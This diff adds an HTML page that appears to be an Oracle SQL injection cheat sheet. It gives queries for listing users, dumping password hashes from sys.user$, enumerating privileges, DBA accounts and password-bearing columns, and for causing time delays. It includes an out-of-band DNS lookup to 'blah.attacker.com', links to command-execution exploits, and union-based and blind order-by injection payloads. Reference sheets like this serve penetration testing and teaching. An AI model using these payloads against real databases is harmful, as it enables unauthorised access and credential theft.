@@ -1,0 +1,206 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Queries</title>
+</head><body>Some can only be run by admin, marked by * or -priv<br/>
+<br/>
+Version 				SELECT banner FROM v$version WHERE banner LIKE ‘Oracle%’;<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT banner FROM v$version WHERE banner LIKE ‘TNS%’;</li>
+<li style="list-style-type: none"> SELECT version FROM v$instance;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Comments 			SELECT 1 FROM dual — comment<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> – NB: SELECT statements must have a FROM clause in Oracle so we have to use the dummy table name ‘dual’ when we’re not actually selecting from a table.</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Current User 			SELECT user FROM dual<br/>
+List Users 			SELECT username FROM all_users ORDER BY username;<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT name FROM sys.user$; — priv</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+List Password Hashes* 	SELECT name, password, astatus FROM sys.user$ — priv, &lt;= 10g. astatus tells you if acct is locked<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT name,spare4 FROM sys.user$ — priv, 11g</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+List Privileges 		SELECT * FROM session_privs; — current privs<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT * FROM dba_sys_privs WHERE grantee = ‘DBSNMP’; — priv, list a user’s privs</li>
+<li style="list-style-type: none"> SELECT grantee FROM dba_sys_privs WHERE privilege = ‘SELECT ANY DICTIONARY’; — priv, find users with a particular priv</li>
+<li style="list-style-type: none"> SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+List DBA Accounts 		SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = ‘YES’; — priv, list DBAs, DBA roles<br/>
+Current Database 		SELECT global_name FROM global_name;<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT name FROM v$database;</li>
+<li style="list-style-type: none"> SELECT instance_name FROM v$instance;</li>
+<li style="list-style-type: none"> SELECT SYS.DATABASE_NAME FROM DUAL;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+List Databases 		SELECT DISTINCT owner FROM all_tables; — list schemas (one per user)<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> – Also query TNS listener for other databases. See <a href="http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html">tnscmd</a>(services | status).</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+List Columns 			SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’;<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT column_name FROM all_tab_columns WHERE table_name = ‘blah’ and owner = ‘foo’;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+List Tables 			SELECT table_name FROM all_tables;<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT owner, table_name FROM all_tables;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Find Tables From <br/>
+Column Name 		SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE ‘%PASS%’; — NB: table names are upper case<br/>
+Select Nth Row 		SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; — gets 9th row (rows numbered from 1)<br/>
+Select Nth Char 		SELECT substr(‘abcd’, 3, 1) FROM dual; — gets 3rd character, ‘c’<br/>
+Bitwise AND 			SELECT bitand(6,2) FROM dual; — returns 2<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT bitand(6,1) FROM dual; — returns0</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+ASCII Value -&gt; Char 	SELECT chr(65) FROM dual; — returns A<br/>
+Char -&gt; ASCII Value 	SELECT ascii(‘A’) FROM dual; — returns 65<br/>
+Casting 				SELECT CAST(1 AS char) FROM dual;<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT CAST(’1′ AS int) FROM dual;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+String Concatenation 	SELECT ‘A’ || ‘B’ FROM dual; — returns AB<br/>
+If Statement 			BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; — doesn’t play well with SELECT statements<br/>
+Case Statement 		SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; — returns 1<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; — returns 2</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Avoiding Quotes 		SELECT chr(65) || chr(66) FROM dual; — returns AB<br/>
+Time Delay 			BEGIN DBMS_LOCK.SLEEP(5); END; — priv, can’t seem to embed this in a SELECT<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — if reverse looks are slow</li>
+<li style="list-style-type: none"> SELECT UTL_INADDR.get_host_address(‘blah.attacker.com’) FROM dual; — if forward lookups are slow</li>
+<li style="list-style-type: none"> SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual; — if outbound TCP is filtered / slow</li>
+<li style="list-style-type: none"> – Also see <a href="http://technet.microsoft.com/en-us/library/cc512676.aspx">Heavy Queries</a>to create a time delay</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Make DNS Requests 	SELECT UTL_INADDR.get_host_address(‘google.com’) FROM dual;<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT UTL_HTTP.REQUEST(‘http://google.com’) FROM dual;</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Command Execution 	<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">Javacan</a>be used to execute commands if it’s installed.<a href="http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql">ExtProc</a>can sometimes be used too, though it normally failed<br/>
+Local File Access 		<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">UTL_FILE</a>can sometimes be used. Check that the following is non-null:<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT value FROM v$parameter2 WHERE name = ‘utl_file_dir’;<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">Java</a>can be used to read and write files if it’s installed (it is not available in Oracle Express).</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Hostname, IP Address 	SELECT UTL_INADDR.get_host_name FROM dual;<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SELECT host_name FROM v$instance;</li>
+<li style="list-style-type: none"> SELECT UTL_INADDR.get_host_address FROM dual; — gets IP address</li>
+<li style="list-style-type: none"> SELECT UTL_INADDR.get_host_name(’10.0.0.1′) FROM dual; — gets hostnames</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+Location of DB files 	SELECT name FROM V$DATAFILE;<br/>
+Default/System <br/>
+Databases 			SYSTEM<ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"><ul><li style="list-style-type: none"> SYSAUX</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<br/>
+<br/>
+Get all tablenames <br/>
+in one string 			select rtrim(xmlagg(xmlelement(e, table_name || ‘,’)).extract(‘//text()’).extract(‘//text()’) ,’,') from all_tables –  when using 					union based SQLI with only one row  <br/>
+Blind SQLI in <br/>
+order by clause 		order by case when ((select 1 from user_tables where substr(lower(table_name), 1, 1) = ‘a’ and rownum = 1)=1) then 						column_name1 else column_name2 end — you must know 2 column names with the same datatype</body></html>
